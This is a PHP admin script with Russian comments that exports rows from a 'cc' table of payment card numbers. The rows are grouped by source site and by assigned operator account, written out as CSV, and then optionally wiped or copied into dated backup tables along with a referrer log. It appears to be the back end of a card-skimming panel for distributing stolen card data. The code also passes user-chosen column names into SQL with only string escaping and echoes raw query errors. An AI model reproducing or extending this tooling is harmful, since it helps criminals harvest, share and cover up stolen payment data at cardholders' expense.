<?php
session_start();

// Проверка CSRF-токена
if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
    die("CSRF token validation failed");
}

// Проверка авторизации
if (!isset($_SESSION['user_logged_in'])) {
    header('Location: ../login.php');
    exit();
}

// Проверка роли пользователя
if (!isset($_SESSION['user_role']) || $_SESSION['user_role'] !== 'admin') {
    header('Location: ../dashboard.php');
    exit();
}

require 'config.php';

// Получаем выбранные поля, разделитель, ID пользователя и url_id из POST-запроса
$selectedFields = $_POST['fields'] ?? [];
$separator = $_POST['separator'] ?? ',';
$userId = $_POST['user_id'] ?? '';
$urlId = $_POST['url_id'] ?? '';

// Проверка наличия выбранных полей
if (empty($selectedFields)) {
    die("Error: No fields selected for export.");
}

// Формируем строку заголовков и столбцов базы данных на основе выбранных полей
$headers = implode($separator, $selectedFields);
$dbColumns = implode(',', array_map(function($field) use ($db) {
    return '`' . $db->real_escape_string($field) . '`';
}, $selectedFields));

// Получаем список назначенных сайтов для выбранного пользователя
$assignedSitesQuery = "SELECT url_id FROM user_sites WHERE user_id = ?";
$stmt = $db->prepare($assignedSitesQuery);
$stmt->bind_param('i', $userId);
$stmt->execute();
$assignedSitesResult = $stmt->get_result();
$assignedSites = [];
while ($row = $assignedSitesResult->fetch_assoc()) {
    if (!empty($row['url_id'])) {
        $assignedSites[] = $row['url_id'];
    }
}

// Формируем запрос для экспорта данных с учетом назначенных сайтов и выбранного url_id
$query = "SELECT $dbColumns FROM cc WHERE payment_cc_number IS NOT NULL";

if (!empty($urlId)) {
    $query .= " AND url_id = '" . $db->real_escape_string($urlId) . "'";
} elseif (!empty($assignedSites)) {
    $assignedSitesStr = "'" . implode("', '", array_map([$db, 'real_escape_string'], $assignedSites)) . "'";
    $query .= " AND url_id IN (" . $assignedSitesStr . ")";
}

// Проверка наличия валидных столбцов перед выполнением запроса
if (empty($dbColumns)) {
    die("Error: No valid columns selected for export.");
}

$result = $db->query($query);

if ($result === false) {
    die("Error executing query: " . $db->error . "\n\nQuery: " . $query);
}

if ($result->num_rows == 0) {
    die("No data found for the specified criteria.");
}

// Настройка заголовков для скачивания CSV
header('Content-Type: text/csv; charset=utf-8');
header('Content-Disposition: attachment; filename="export_' . date('Y-m-d') . '.csv"');

$output = fopen('php://output', 'w');
fputs($output, $headers . "\n");

while ($row = $result->fetch_assoc()) {
    fputcsv($output, $row, $separator);
}

fclose($output);

// Очистка данных, если требуется
if (isset($_GET['clear'])) {
    if (!empty($urlId)) {
        // Удаление записей из таблицы cc для выбранного сайта
        $clearCcQuery = "DELETE FROM cc WHERE url_id = '" . $db->real_escape_string($urlId) . "'";
        $db->query($clearCcQuery);
        
        // Удаление записей из таблицы full_log для выбранного сайта
        $clearFullLogQuery = "DELETE FROM full_log WHERE referrer = '" . $db->real_escape_string($urlId) . "'";
        $db->query($clearFullLogQuery);
    } elseif (!empty($userId)) {
        $assignedSitesStr = "'" . implode("', '", array_map([$db, 'real_escape_string'], $assignedSites)) . "'";
        
        // Удаление записей из таблицы cc для выбранного пользователя
        $clearCcQuery = "DELETE FROM cc WHERE url_id IN (" . $assignedSitesStr . ")";
        $db->query($clearCcQuery);
        
        // Удаление записей из таблицы full_log для выбранного пользователя
        $clearFullLogQuery = "DELETE FROM full_log WHERE referrer IN (" . $assignedSitesStr . ")";
        $db->query($clearFullLogQuery);
    } else {
        // Получаем текущую дату в формате ддмм
        $date = date('dm');

        // Создаем имена новых таблиц
        $newTableNameCC = "cc" . $date;
        $newTableNameFullLog = "full_log" . $date;

        // Копируем данные в новые таблицы
        $db->query("CREATE TABLE $newTableNameCC LIKE cc");
        $db->query("INSERT INTO $newTableNameCC SELECT * FROM cc");

        $db->query("CREATE TABLE $newTableNameFullLog LIKE full_log");
        $db->query("INSERT INTO $newTableNameFullLog SELECT * FROM full_log");

        // Очистка всех таблиц, если пользователь и url_id не указаны
        $db->query("TRUNCATE TABLE cc");
        $db->query("TRUNCATE TABLE full_log");
    }
}

$db->close();